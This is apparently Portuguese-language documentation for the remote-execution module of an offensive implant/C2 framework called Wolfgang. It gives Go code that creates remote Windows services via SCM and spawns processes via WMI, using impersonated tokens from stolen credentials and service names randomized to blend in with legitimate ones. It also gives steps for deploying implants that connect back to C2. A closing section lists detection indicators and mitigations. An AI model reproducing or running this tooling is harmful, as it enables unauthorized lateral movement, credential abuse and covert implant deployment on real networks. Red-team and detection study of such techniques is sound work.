    Execução Remota¶

    O que é¶

    Execução remota permite que o operador execute comandos em máquinas Windows remotas usando credenciais obtidas via Credential Access. O Wolfgang implementa dois métodos de execução remota, cada um explorando um subsistema diferente do Windows:

    • SCM (Service Control Manager): Cria um serviço remoto temporário que executa o comando
    • WMI (Windows Management Instrumentation): Usa Win32_Process.Create para spawnar processos remotamente

    Ambos operam sobre protocolos nativos do Windows (RPC/DCOM) e não requerem software adicional no alvo -- são técnicas "living off the land".

    Por que funciona¶

    SCM (Service Control Manager)¶

    O SCM é o serviço do Windows que gerencia serviços do sistema. A API de gerenciamento remoto permite criar, iniciar, parar e deletar serviços em máquinas remotas via named pipes (SMB) ou RPC.

    Qualquer conta com privilégios de administrador no alvo pode:

    1. Conectar ao SCM remoto via \\target\pipe\svcctl
    2. Criar um serviço com um binPath que executa o comando desejado
    3. Iniciar o serviço (que executa o comando como SYSTEM)
    4. Deletar o serviço para cleanup

    O comando executa como NT AUTHORITY\SYSTEM porque serviços rodam no contexto do sistema por padrão.

    WMI (Windows Management Instrumentation)¶

    WMI é a implementação Microsoft do WBEM (Web-Based Enterprise Management). O namespace root\cimv2 contém a classe Win32_Process com o método Create, que permite criar processos remotamente.

    A conexão é feita via DCOM (Distributed Component Object Model), que autentica usando as credenciais do chamador (ou credenciais explícitas via token impersonation).

    Implementação no Wolfgang¶

    O módulo remote_exec (pkg/module/lateral/remote/) usa uma interface RemoteExecutor para abstrair os dois métodos:

    type RemoteExecutor interface {
    Execute(ctx context.Context, target, command string, token uintptr) error
    Name() string
    Cleanup(ctx context.Context, target string) error
}

    O módulo instancia ambos os executors:

    func NewRemoteExecModule() *RemoteExecModule {
    m := &RemoteExecModule{
        executors: make(map[string]RemoteExecutor),
    }
    scm := &SCMExecutor{}
    wmi := &WMIExecutor{}
    m.executors[scm.Name()] = scm
    m.executors[wmi.Name()] = wmi
    return m
}

    SCM Executor¶

    O SCMExecutor cria um serviço remoto com nome randomizado, inicia e opcionalmente faz cleanup:

    var scmPrefixes = []string{"WinSvcUpdate", "MSSvcHost", "SysEventBroker"}

func (e *SCMExecutor) Execute(ctx context.Context, target, command string, token uintptr) error {
    // Token impersonation para autenticação
    if token != 0 {
        impersonateLoggedOnUser(windows.Token(token))
        defer windows.RevertToSelf()
    }

    // Nome randomizado para o serviço
    e.serviceName = generateServiceName()

    // Conecta ao SCM remoto
    m, _ := mgr.ConnectRemote(target)
    defer m.Disconnect()

    // Cria e inicia o serviço
    svc, _ := m.CreateService(e.serviceName, buildServiceCommand(command), mgr.Config{
        StartType: mgr.StartManual,
    })
    defer svc.Close()

    svc.Start()
    return nil
}

    Geração de nome: O serviço usa prefixos que se misturam com serviços legítimos do Windows, seguidos de um sufixo hex randomizado:

    func generateServiceName() string {
    idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(scmPrefixes))))
    suffix := make([]byte, 4)
    rand.Read(suffix)
    return scmPrefixes[idx.Int64()] + hex.EncodeToString(suffix)
}

    Exemplos: WinSvcUpdate7a3f2e1d, MSSvcHostb4c8d912, SysEventBroker5e9a1f03.

    Comando: O comando é wrappado em cmd.exe /c para suportar shell syntax:

    func buildServiceCommand(command string) string {
    return `cmd.exe /c ` + command
}

    Cleanup: O executor pode parar e deletar o serviço após a execução:

    func (e *SCMExecutor) Cleanup(ctx context.Context, target string) error {
    m, _ := mgr.ConnectRemote(target)
    svc, _ := m.OpenService(e.serviceName)
    svc.Control(windows.SERVICE_CONTROL_STOP)
    return svc.Delete()
}

    WMI Executor¶

    O WMIExecutor usa COM/DCOM para invocar Win32_Process.Create remotamente:

    func (e *WMIExecutor) Execute(ctx context.Context, target, command string, token uintptr) error {
    runtime.LockOSThread()
    defer runtime.UnlockOSThread()

    ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED)
    defer ole.CoUninitialize()

    if token != 0 {
        impersonateLoggedOnUser(windows.Token(token))
        defer windows.RevertToSelf()
    }

    // Conecta ao WMI remoto
    unknown, _ := oleutil.CreateObject("WbemScripting.SWbemLocator")
    defer unknown.Release()

    wmi, _ := unknown.QueryInterface(ole.IID_IDispatch)
    defer wmi.Release()

    connStr := `\\` + target + `\root\cimv2`
    svcRaw, _ := oleutil.CallMethod(wmi, "ConnectServer", connStr)
    svc := svcRaw.ToIDispatch()
    defer svc.Release()

    // Win32_Process.Create
    procRaw, _ := oleutil.CallMethod(svc, "Get", "Win32_Process")
    proc := procRaw.ToIDispatch()
    defer proc.Release()

    resultRaw, _ := oleutil.CallMethod(proc, "Create", command)
    ret := resultRaw.Value().(int32)
    if ret != 0 {
        return fmt.Errorf("Win32_Process.Create returned %d", ret)
    }
    return nil
}

    runtime.LockOSThread(): Necessário porque COM é thread-affinitized -- a goroutine precisa ficar no mesmo thread OS durante toda a interação COM.

    Cleanup: WMI não cria artefatos persistentes (sem serviço para deletar):

    func (e *WMIExecutor) Cleanup(_ context.Context, _ string) error { return nil }

    Token Impersonation¶

    Ambos os executors suportam token impersonation para autenticar com credenciais de outro usuário (obtidas via credential theft ou token manipulation):

    if token != 0 {
    impersonateLoggedOnUser(windows.Token(token))
    defer windows.RevertToSelf()
}

    Parâmetros do módulo¶

    Parâmetro Descrição Obrigatório
    target Hostname ou IP do alvo Sim
    command Comando a executar Sim
    method scm ou wmi (default: scm) Nao
    action exec ou cleanup (default: exec) Nao
    token Handle de token para impersonation Nao

    Considerações Operacionais¶

    Quando usar SCM vs WMI¶

    Cenário Recomendação Motivo
    Precisa executar como SYSTEM SCM Serviços rodam como SYSTEM
    Quer menor footprint WMI Sem criação de serviço
    Porta 445 bloqueada, 135 aberta WMI WMI usa DCOM (135+ephemeral)
    Precisa de output do comando Nenhum Ambos são fire-and-forget

    Limitações¶

    • Fire-and-forget: Nenhum dos métodos retorna o output do comando. Para capturar output, redirecionar para um arquivo e ler via SMB.
    • Requer admin remoto: Ambos precisam de credenciais com privilégios administrativos no host alvo.
    • Windows-only: Ambos dependem de subsistemas específicos do Windows.

    Deploying implants¶

    O caso de uso mais comum é deployar um novo implant:

    1. Upload do implant para um share acessível (C$, ADMIN$)
    2. Execução remota do implant via SCM ou WMI
    3. O implant conecta de volta ao C2

    Detecção¶

    IOC Método Descrição
    Event ID 7045 (System log) SCM Criação de novo serviço
    Event ID 7036 (System log) SCM Serviço iniciado/parado
    Serviço com binPath contendo cmd.exe /c SCM Padrão de execução via serviço
    Nome de serviço com sufixo hex randomizado SCM Naming pattern do Wolfgang
    Event ID 4688 (Security log) WMI Criação de processo (com process command line audit)
    WMI event subscription WMI Atividade DCOM remota
    Conexão RPC para \pipe\svcctl SCM Acesso remoto ao SCM
    Conexão DCOM para porta 135 + ephemeral WMI Comunicação WMI

    Mitigações:

    • Restringir admin remoto: Desabilitar Remote SCM e WMI para contas não-necessárias
    • Protected Users group: Impede NTLM authentication, limitando pass-the-hash
    • Windows Firewall: Bloquear portas 135, 445 entre estações de trabalho
    • Auditar criação de serviços: Event ID 7045 com command line logging
